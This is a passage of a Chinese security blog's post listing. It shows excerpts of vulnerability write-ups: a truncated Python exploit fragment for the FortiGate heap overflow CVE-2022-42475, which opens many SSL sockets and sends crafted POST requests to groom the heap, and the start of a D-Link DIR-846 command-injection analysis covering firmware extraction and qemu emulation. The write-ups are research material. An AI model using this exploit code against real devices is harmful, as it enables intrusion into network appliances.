abmiabmjabmkabmlabmmabmnabmoabmpabmqabmrabmsabmtabmuabmvabmwabmxabmyabmzabnbabncabndabneabnfabngabnhabniabnjabnkabnlabnmabnnabnoabnpabnqabnrabnsabntabnuabnvabnwabnxabnyabnza&#39;def create_ssl_ctx():_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)_socket.connect((ip, port))_default_context = ssl._create_unverified_context()_socket = _default_context.wrap_socket(_socket)return _socketdef make_socks(payload):socks = []for i in range(60):sk = create_ssl_ctx()data = b&#34;POST &#34; &#43; path &#43; b&#34; HTTP/1.1\r\nHost: 192.168.113.1\r\nContent-Length: 100\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&#34;sk.sendall(data)socks.append(sk)for i in range(20, 40, 2):sk = socks[i]sk....</p>
  </div>
  <footer class="entry-footer">2 min&nbsp;·&nbsp;shangdi4sb</footer>
  <a class="entry-link" aria-label="post link to CVE-2022-42475 FortiGate 飞塔堆溢出漏洞利用方式" href="https://jellyfish-pro.github.io/posts/cve-2022-42475-fortigate-%E9%A3%9E%E5%A1%94%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"></a>
</article>

<article class="post-entry"> 
  <header class="entry-header">
    <h2>CVE-2022-46641 D-Link dir-846命令注入漏洞
    </h2>
  </header>
  <div class="entry-content">
    <p>CVE-2022-46641 D-Link dir-846命令注入漏洞 漏洞信息 D-Link dir-846路由，是D-Link生产的小型家用路由器。
该漏洞是对用户输入的字符串检测不够严格造成的。
固件版本：A1_FW100A43
影响范围：dlink:dir-846_firmware:100a43
测试环境：Ubuntu20 &#43; qemu模拟debian
环境模拟 在[github]([IoTvuln/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md at main · CyberUnicornIoT/IoTvuln · GitHub](https://github.com/CyberUnicornIoT/IoTvuln/blob/main/d-link/dir-846/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md))上的信息显示固件的版本为：A1_FW100A43
我们可以直接在[官网](D-Link Technical Support (dlink.com.cn))进行下载
下载下来后使用binwalk解压：
binwalk -Me1 DIR846A1_FW100A43.bin 便可以得到一个类似linux系统根目录的文件夹
这里我们先找到我们需要启动的服务路径和名称。
根据经验，名称一般和httpd相关所以我们直接搜索httpd相关的文件：
可以看到在 /usr/sbin目录下有一个lighttpd文件，那么我们可以试一试这个文件：
首先看一看目标文件的架构：
可以看到是32位mips的小段
qemu-user 启动失败 这里我们选择qemu-mipsel-static（qemu-mips-static是大段架构），把qemu复制到dlink的根目录下后，启动http服务：
sudo ./qemu-mipsel-static -L . ./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf -L .：类似于chroot .
-D：显示报错信息
-f ：指定配置文件
然后我们进行访问：
发现服务可以访问，但浏览器上什么都没有，同时终端上有报错信息：
根据报错信息，我们可以大致猜测该问题应该是php相关的服务没有启动（大致猜测（×），百度一下（√））。例如 backend died指的是后端出错了，那么可能是php中的管理后端cgi的服务：fastcgi没有启动
我们退出qemu，搜索一下php-fastcgi相关的文件：
这里根据linux目录，可以判断我们需要启动 /etc/init.d/php7-fastcgi。...</p>
  </div>
  <footer class="entry-footer">2 min&nbsp;·&nbsp;shangdi4sb</footer>
  <a class="entry-link" aria-label="post link to CVE-2022-46641 D-Link dir-846命令注入漏洞" href="https://jellyfish-pro.github.io/posts/cve-2022-46641-d-link-dir-846%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"></a>
</article>
<footer class="page-footer">
  <nav class="pagination">
    <a class="next" href="https://jellyfish-pro.github.io/posts/page/2/">Next&nbsp;&nbsp;»
    </a>
  </nav>
</footer>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="https://jellyfish-pro.github.io">CAI dog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
